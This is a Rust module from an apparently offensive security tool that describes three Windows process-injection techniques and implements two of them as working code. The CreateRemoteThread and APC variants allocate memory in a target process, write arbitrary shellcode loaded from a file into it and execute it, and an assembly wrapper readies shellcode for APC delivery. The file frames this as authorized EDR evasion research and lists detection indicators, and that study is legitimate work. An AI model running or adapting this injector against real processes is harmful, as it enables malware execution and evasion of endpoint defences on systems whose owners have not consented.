// Badang — Process Injection Module
// Demonstrates process injection techniques for EDR evasion research
// For authorized security research only.

use crate::log::LogSink;

#[allow(dead_code)]
#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionTechnique {
    CreateRemoteThread,
    APC,
    ThreadHijack,
}

impl InjectionTechnique {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "createremote" | "createremotethread" => Some(Self::CreateRemoteThread),
            "apc" | "apcinjection" => Some(Self::APC),
            "hijack" | "threadhijack" | "threadhijacking" | "setthreadcontext" => {
                Some(Self::ThreadHijack)
            }
            _ => None,
        }
    }

    pub fn name(&self) -> &str {
        match self {
            InjectionTechnique::CreateRemoteThread => "CreateRemoteThread",
            InjectionTechnique::APC => "APC Injection",
            InjectionTechnique::ThreadHijack => "Thread Hijack (SetThreadContext)",
        }
    }
}

pub fn analyze(technique: &str, log: &LogSink) {
    dry_run(0, technique, log);
}

pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
    if let Some(t) = InjectionTechnique::from_str(technique) {
        log.info(format!("  Target PID: {}", pid));
        log.info(format!("  Technique: {}", t.name()));

        match t {
            InjectionTechnique::CreateRemoteThread => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess (PROCESS_ALL_ACCESS) on target PID");
                log.detail("    2. NtAllocateVirtualMemory / VirtualAllocEx in target process");
                log.detail("    3. NtWriteVirtualMemory / WriteProcessMemory to write payload");
                log.detail("    4. NtProtectVirtualMemory to set PAGE_EXECUTE_READ");
                log.detail("    5. NtCreateThreadEx / CreateRemoteThread to execute");
                log.detail("    6. WaitForSingleObject to wait for completion");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - ALL of these APIs are heavily hooked by EDRs");
                log.warning("    - RWX memory pages are a major indicator");
                log.warning("    - Cross-process memory writes are monitored");
                log.warning("    - Remote thread creation is a key indicator");
            }
            InjectionTechnique::APC => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess on target PID");
                log.detail("    2. Allocate + write memory in target");
                log.detail("    3. Enumerate threads via NtGetNextThread / Thread32First");
                log.detail("    4. Queue APC to target thread via NtQueueApcThread");
                log.detail("    5. APC executes when thread enters alertable state");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - APC queue manipulation is monitored");
                log.warning("    - Thread enumeration across processes is flagged");
                log.warning("    - Memory allocation + write + APC queue = strong signal");
            }
            InjectionTechnique::ThreadHijack => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess on target PID");
                log.detail("    2. SuspendThread on target thread");
                log.detail("    3. Allocate + write memory in target");
                log.detail("    4. SetThreadContext to redirect thread to injected code");
                log.detail("    5. ResumeThread to execute");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - Thread suspension + context modification is monitored");
                log.warning("    - Suspended threads are a known indicator");
                log.warning("    - Memory write + context change = strong signal");
            }
        }
    } else {
        log.error(format!("  Unknown technique: {}", technique));
        log.info("  Known techniques: createremote, apc, hijack");
    }
}

pub fn print_info(log: &LogSink) {
    log.info("");
    log.info("=== Process Injection Techniques ===");
    log.info("");
    log.info("What it does:");
    log.detail("  Inserts code into another process's address space and executes it.");
    log.detail("  This is a fundamental technique for malware, red teams, and");
    log.detail("  security research. EDRs detect this through API hooking and");
    log.detail("  behavioral analysis.");
    log.info("");
    log.info("Techniques implemented:");
    log.info("  1. CreateRemoteThread");
    log.detail("     - Classic remote thread creation via NtCreateThreadEx");
    log.detail("     - Allocate memory in target, write payload, execute");
    log.warning("     - Heavily detected — almost all EDRs hook these APIs");
    log.info("");
    log.info("  2. APC Injection");
    log.detail("     - Queue an APC to a target thread");
    log.detail("     - Code executes when thread enters alertable state");
    log.warning("     - Also heavily monitored");
    log.info("");
    log.info("  3. Thread Hijack (SetThreadContext)");
    log.detail("     - Suspend a thread, modify its context to point to injected code");
    log.detail("     - Resume thread to execute");
    log.warning("     - Suspended thread manipulation is monitored");
    log.info("");
    log.warning("Detection considerations:");
    log.warning("  - All these techniques are WELL KNOWN to EDR vendors");
    log.warning("  - Modern EDRs hook the underlying NT APIs");
    log.warning("  - Behavioral analysis looks for the injection pattern");
    log.warning("  - RWX memory pages are a major red flag");
    log.warning("  - Cross-process operations are heavily monitored");
    log.warning("  - This is an arms race — techniques evolve, EDRs adapt");
    log.info("");
    log.info("Ethical note:");
    log.detail("  These techniques are used by malware AND by security researchers.");
    log.detail("  Understanding them is essential for defense. Use responsibly.");
    log.info("");
}

pub fn load_payload(path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(path).map_err(|e| format!("failed to read payload file '{}': {}", path, e))
}

#[derive(Debug)]
pub struct InjectionResult {
    pub remote_base: u64,
    pub size: usize,
}

pub fn live_inject(
    pid: u32,
    technique: &InjectionTechnique,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    if shellcode.is_empty() {
        return Err("shellcode is empty — nothing to inject".to_string());
    }
    crate::safety::validate_target(pid).map_err(|e| format!("target validation failed: {}", e))?;
    match technique {
        InjectionTechnique::CreateRemoteThread => {
            imp::live_inject_create_remote_thread(pid, shellcode, log)
        }
        InjectionTechnique::APC => imp::live_inject_apc(pid, shellcode, log),
        InjectionTechnique::ThreadHijack => Err(format!(
            "live injection is not yet implemented for technique '{}'",
            technique.name()
        )),
    }
}

pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, log: &LogSink) {
    let shellcode = match load_payload(payload_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            log.error(format!("ERROR: {}", e));
            return;
        }
    };
    let technique = match InjectionTechnique::from_str(technique_name) {
        Some(t) => t,
        None => {
            log.error(format!(
                "ERROR: unknown injection technique '{}'",
                technique_name
            ));
            log.info("Known techniques: createremote, apc, hijack");
            return;
        }
    };
    log.info("");
    log.step(format!("=== LIVE INJECTION — {} ===", technique.name()));
    log.info(format!(
        "  Payload: {} ({} bytes)",
        payload_path,
        shellcode.len()
    ));
    log.info(format!("  Target PID: {}", pid));
    log.warning("  WARNING: this performs REAL Win32 calls against a live process.");
    log.warning("  Proceed only in an authorized, isolated research environment.");
    log.info("");
    match live_inject(pid, &technique, &shellcode, log) {
        Ok(result) => {
            log.info("");
            log.step("[DONE] Injection chain completed.");
            log.info(format!(
                "  Shellcode lives at remote address 0x{:X} ({} bytes)",
                result.remote_base, result.size
            ));
            log.info("  Use 'cleanup' to free remote memory when done.");
        }
        Err(e) => {
            log.info("");
            log.error(format!("[FAILED] Injection chain aborted: {}", e));
        }
    }
}

pub fn cleanup_remote(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
    imp::cleanup(pid, remote_base, size, log);
}

#[rustfmt::skip]
pub(crate) fn wrap_for_apc(shellcode: &[u8]) -> Vec<u8> {
    const PROLOGUE: &[u8] = &[
        0x53,                           // push rbx
        0x55,                           // push rbp
        0x57,                           // push rdi
        0x56,                           // push rsi
        0x41, 0x54,                     // push r12
        0x41, 0x55,                     // push r13
        0x41, 0x56,                     // push r14
        0x41, 0x57,                     // push r15
        0x48, 0x83, 0xEC, 0x28,        // sub rsp, 0x28
        0xE8, 0x11, 0x00, 0x00, 0x00,  // call +17 (jump over epilogue to shellcode)
    ];
    const EPILOGUE: &[u8] = &[
        0x48, 0x83, 0xC4, 0x28,        // add rsp, 0x28
        0x41, 0x5F,                     // pop r15
        0x41, 0x5E,                     // pop r14
        0x41, 0x5D,                     // pop r13
        0x41, 0x5C,                     // pop r12
        0x5E,                           // pop rsi
        0x5F,                           // pop rdi
        0x5D,                           // pop rbp
        0x5B,                           // pop rbx
        0xC3,                           // ret
    ];

    let mut wrapped = Vec::with_capacity(PROLOGUE.len() + EPILOGUE.len() + shellcode.len());
    wrapped.extend_from_slice(PROLOGUE);
    wrapped.extend_from_slice(EPILOGUE);
    wrapped.extend_from_slice(shellcode);
    wrapped
}

#[cfg(windows)]
mod imp {
    use crate::log::LogSink;
    use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE, WAIT_OBJECT_0};
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, GetExitCodeThread, OpenProcess, OpenThread, QueueUserAPC,
        WaitForSingleObject, INFINITE, LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD,
        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        THREAD_SET_CONTEXT,
    };

    pub fn live_inject_create_remote_thread(
        pid: u32,
        shellcode: &[u8],
        log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        log.step(format!(
            "[1/6] OpenProcess(PID {}) — PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
            pid
        ));
        let process_access = PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE;
        let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
            format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
        })?;

        let result = crt_inject_chain(process, shellcode, log);
        let _ = unsafe { CloseHandle(process) };
        result
    }

    fn free_remote(process: HANDLE, base: *mut core::ffi::c_void, log: &LogSink) {
        log.detail("[cleanup] VirtualFreeEx — MEM_RELEASE");
        unsafe {
            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
        }
    }

    pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
        log.step(format!(
            "[CLEANUP] Freeing {} bytes at 0x{:X} in PID {}",
            size, remote_base, pid
        ));
        let process = match unsafe {
            OpenProcess(PROCESS_VM_OPERATION, FALSE, pid)
        } {
            Ok(h) => h,
            Err(e) => {
                log.error(format!("OpenProcess failed: {e}"));
                return;
            }
        };
        let base = remote_base as *mut core::ffi::c_void;
        let result = unsafe { VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        let _ = unsafe { CloseHandle(process) };
        match result {
            Ok(()) => log.step("[CLEANUP] Remote memory freed successfully."),
            Err(e) => log.error(format!("[CLEANUP] VirtualFreeEx failed: {e}")),
        }
    }

    fn write_remote_payload(
        process: HANDLE,
        shellcode: &[u8],
        total_steps: u32,
        log: &LogSink,
    ) -> Result<*mut core::ffi::c_void, String> {
        let size = shellcode.len();

        log.step(format!(
            "[2/{}] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE",
            total_steps
        ));
        let base = unsafe {
            VirtualAllocEx(
                process,
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if base.is_null() {
            return Err(
                "VirtualAllocEx returned NULL — allocation failed (check AV/privileges)"
                    .to_string(),
            );
        }
        log.info(format!(
            "      allocated RW region at remote address {:#p} ({} bytes)",
            base, size
        ));

        log.step(format!("[3/{}] WriteProcessMemory — {} bytes", total_steps, size));
        let mut written: usize = 0;
        if let Err(e) = unsafe {
            WriteProcessMemory(
                process,
                base as *const core::ffi::c_void,
                shellcode.as_ptr() as *const core::ffi::c_void,
                size,
                Some(&mut written),
            )
        } {
            free_remote(process, base, log);
            return Err(format!("WriteProcessMemory failed: {e}"));
        }
        log.info(format!("      wrote {} bytes", written));

        log.step(format!(
            "[4/{}] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ",
            total_steps
        ));
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        if let Err(e) = unsafe {
            VirtualProtectEx(
                process,
                base as *const core::ffi::c_void,
                size,
                PAGE_EXECUTE_READ,
                &mut old_protect,
            )
        } {
            free_remote(process, base, log);
            return Err(format!("VirtualProtectEx failed: {e}"));
        }
        log.info(format!(
            "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
            old_protect.0
        ));

        Ok(base)
    }

    fn crt_inject_chain(
        process: HANDLE,
        shellcode: &[u8],
        log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        let size = shellcode.len();
        let base = write_remote_payload(process, shellcode, 6, log)?;

        log.step(format!(
            "[5/6] CreateRemoteThread — start at remote address {:#p}",
            base
        ));
        let start: LPTHREAD_START_ROUTINE = Some(unsafe {
            core::mem::transmute::<
                *mut core::ffi::c_void,
                unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
            >(base)
        });
        let mut thread_id: u32 = 0;
        let thread = match unsafe {
            CreateRemoteThread(
                process,
                None,
                0,
                start,
                Some(base as *const core::ffi::c_void),
                0,
                Some(&mut thread_id),
            )
        } {
            Ok(h) => h,
            Err(e) => {
                free_remote(process, base, log);
                return Err(format!("CreateRemoteThread failed: {e}"));
            }
        };
        log.info(format!("      remote thread started (TID {})", thread_id));

        log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
        let wait = unsafe { WaitForSingleObject(thread, INFINITE) };
        if wait != WAIT_OBJECT_0 {
            free_remote(process, base, log);
            let _ = unsafe { CloseHandle(thread) };
            return Err(format!(
                "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
                wait.0
            ));
        }
        let mut exit_code: u32 = 0;
        if let Err(e) = unsafe { GetExitCodeThread(thread, &mut exit_code) } {
            free_remote(process, base, log);
            let _ = unsafe { CloseHandle(thread) };
            return Err(format!("GetExitCodeThread failed: {e}"));
        }
        let _ = unsafe { CloseHandle(thread) };

        if exit_code == 259 {
            free_remote(process, base, log);
            return Err("remote thread is still active after an INFINITE wait".to_string());
        }
        if exit_code == 0xC0000005 {
            log.error(format!(
                "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
                exit_code
            ));
            log.error("      the shellcode hit an invalid memory access");
            log.error(
                "      the injection pipeline is OK (NOP payload works) — the payload is broken",
            );
        } else if exit_code >= 0xC0000000 {
            log.warning(format!(
                "      remote thread exited with NTSTATUS error 0x{:X}",
                exit_code
            ));
        } else {
            log.info(format!(
                "      remote thread exited with code {}",
                exit_code
            ));
        }
        log.info(format!(
            "      shellcode remains at remote address {:#p} ({} bytes)",
            base, size
        ));
        Ok(super::InjectionResult {
            remote_base: base as u64,
            size,
        })
    }

    pub fn live_inject_apc(
        pid: u32,
        shellcode: &[u8],
        log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        log.step(format!(
            "[1/5] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
            pid
        ));
        let process_access = PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE;
        let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
            format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
        })?;

        let result = apc_inject_chain(process, pid, shellcode, log);
        let _ = unsafe { CloseHandle(process) };
        result
    }

    fn apc_inject_chain(
        process: HANDLE,
        pid: u32,
        shellcode: &[u8],
        log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        let wrapped = super::wrap_for_apc(shellcode);
        let size = wrapped.len();
        let base = write_remote_payload(process, &wrapped, 5, log)?;

        log.step("[5/5] QueueUserAPC — enumerating threads and queuing APCs");

        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
            free_remote(process, base, log);
            format!("CreateToolhelp32Snapshot failed: {e}")
        })?;

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut queued: u32 = 0;
        let mut total: u32 = 0;

        if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid {
                    total += 1;
                    if let Ok(thread) =
                        unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID) }
                    {
                        let apc_func = Some(unsafe {
                            core::mem::transmute::<
                                *mut core::ffi::c_void,
                                unsafe extern "system" fn(usize),
                            >(base)
                        });
                        if unsafe { QueueUserAPC(apc_func, thread, 0) } != 0 {
                            queued += 1;
                            log.info(format!(
                                "      queued APC to thread TID {}",
                                entry.th32ThreadID
                            ));
                        }
                        let _ = unsafe { CloseHandle(thread) };
                    }
                }
                if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
                    break;
                }
            }
        }
        let _ = unsafe { CloseHandle(snapshot) };

        if queued == 0 {
            free_remote(process, base, log);
            if total == 0 {
                return Err(format!("no threads found for PID {}", pid));
            }
            return Err(format!(
                "found {} threads but could not queue APC to any of them",
                total
            ));
        }

        log.info(format!(
            "      APCs queued to {}/{} threads",
            queued, total
        ));
        log.warning("      shellcode executes when a thread enters alertable wait (async)");
        log.info(format!(
            "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
            base, size,
            size - 38
        ));
        Ok(super::InjectionResult {
            remote_base: base as u64,
            size,
        })
    }
}

#[cfg(not(windows))]
mod imp {
    use crate::log::LogSink;

    pub fn live_inject_create_remote_thread(
        _pid: u32,
        _shellcode: &[u8],
        _log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        Err(
            "live injection requires Windows — this build is running on a non-Windows host"
                .to_string(),
        )
    }

    pub fn live_inject_apc(
        _pid: u32,
        _shellcode: &[u8],
        _log: &LogSink,
    ) -> Result<super::InjectionResult, String> {
        Err(
            "live injection requires Windows — this build is running on a non-Windows host"
                .to_string(),
        )
    }

    pub fn cleanup(_pid: u32, _remote_base: u64, _size: usize, log: &LogSink) {
        log.error("Cleanup requires Windows — this build is running on a non-Windows host");
    }
}
